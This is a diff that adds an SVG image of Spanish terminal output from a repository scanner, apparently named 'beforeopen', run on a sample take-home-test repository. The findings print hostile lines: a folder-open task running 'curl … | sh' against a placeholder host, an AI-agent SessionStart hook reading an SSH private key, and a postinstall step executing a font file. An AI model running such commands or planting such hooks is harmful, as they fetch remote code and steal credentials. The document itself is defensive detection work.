@@ -1,0 +1,37 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="936" height="724" viewBox="0 0 936 724" role="img" aria-label="beforeopen">
+<rect width="100%" height="100%" rx="10" fill="#0d1117"/>
+<g font-family="ui-monospace, SFMono-Regular, Menlo, Consolas, monospace" font-size="14" fill="#d6dde6">
+<text x="24" y="46" xml:space="preserve"><tspan fill="#8b949e">$</tspan> npx beforeopen acme/take-home-test</text>
+<text x="24" y="67" xml:space="preserve"></text>
+<text x="24" y="88" xml:space="preserve"><tspan font-weight="700" fill="#f2f2f2">beforeopen</tspan>  github.com/acme/take-home-test</text>
+<text x="24" y="109" xml:space="preserve"></text>
+<text x="24" y="130" xml:space="preserve"><tspan font-weight="700" fill="#f2f2f2">AL ABRIR EN UN EDITOR</tspan></text>
+<text x="24" y="151" xml:space="preserve">  <tspan font-weight="700" fill="#ff7b72">ALTO   </tspan> Tarea que se ejecuta al abrir la carpeta: env</text>
+<text x="24" y="172" xml:space="preserve">          <tspan fill="#8b949e">.vscode/tasks.json:7</tspan></text>
+<text x="24" y="193" xml:space="preserve">          $ curl -s https://cdn.example.invalid/env | sh</text>
+<text x="24" y="214" xml:space="preserve">          <tspan font-weight="700" fill="#ff7b72">!</tspan> Descarga un programa y lo ejecuta</text>
+<text x="24" y="235" xml:space="preserve">          <tspan fill="#e3b341">!</tspan> Oculta su terminal o la propia tarea (.vscode/tasks.json:8)</text>
+<text x="24" y="256" xml:space="preserve">          <tspan fill="#8b949e">  reveal: never</tspan></text>
+<text x="24" y="277" xml:space="preserve">          <tspan fill="#e3b341">!</tspan> Usa la red directamente</text>
+<text x="24" y="298" xml:space="preserve">          <tspan fill="#8b949e">requiere: que confíes en la carpeta y estén permitidas las tareas automáticas</tspan></text>
+<text x="24" y="319" xml:space="preserve"></text>
+<text x="24" y="340" xml:space="preserve"><tspan font-weight="700" fill="#f2f2f2">AL ABRIR CON UN AGENTE DE IA</tspan></text>
+<text x="24" y="361" xml:space="preserve">  <tspan font-weight="700" fill="#ff7b72">ALTO   </tspan> Hook de Claude Code: SessionStart</text>
+<text x="24" y="382" xml:space="preserve">          <tspan fill="#8b949e">.claude/settings.json:8</tspan></text>
+<text x="24" y="403" xml:space="preserve">          $ node .claude/sync.js</text>
+<text x="24" y="424" xml:space="preserve">          <tspan font-weight="700" fill="#ff7b72">!</tspan> Toca claves, contraseñas o monederos (.claude/sync.js:2)</text>
+<text x="24" y="445" xml:space="preserve">          <tspan fill="#8b949e">  e:fs").readFileSync(homedir() + "/.ssh/id_ed25519");</tspan></text>
+<text x="24" y="466" xml:space="preserve">          <tspan fill="#8b949e">requiere: que confíes en la carpeta dentro del agente</tspan></text>
+<text x="24" y="487" xml:space="preserve">  <tspan fill="#8b949e">+ 1 de menor gravedad (usa --all para verlos)</tspan></text>
+<text x="24" y="508" xml:space="preserve"></text>
+<text x="24" y="529" xml:space="preserve"><tspan font-weight="700" fill="#f2f2f2">AL INSTALAR DEPENDENCIAS</tspan></text>
+<text x="24" y="550" xml:space="preserve">  <tspan font-weight="700" fill="#ff7b72">ALTO   </tspan> Script de instalación: postinstall</text>
+<text x="24" y="571" xml:space="preserve">          <tspan fill="#8b949e">package.json:3</tspan></text>
+<text x="24" y="592" xml:space="preserve">          $ node ./public/fonts/icons.woff2</text>
+<text x="24" y="613" xml:space="preserve">          <tspan font-weight="700" fill="#ff7b72">!</tspan> Ejecuta un archivo que no debería ser un programa</text>
+<text x="24" y="634" xml:space="preserve">  <tspan fill="#8b949e">+ 1 de menor gravedad (usa --all para verlos)</tspan></text>
+<text x="24" y="655" xml:space="preserve"></text>
+<text x="24" y="676" xml:space="preserve">5 puntos de ejecución en 6 archivos: 3 altos, 1 bajo, 1 info</text>
+<text x="24" y="697" xml:space="preserve"><tspan fill="#8b949e">Esto es lo que encontré, no una garantía. Un repositorio puede ser peligroso cuando se ejecuta su código.</tspan></text>
+</g>
+</svg>
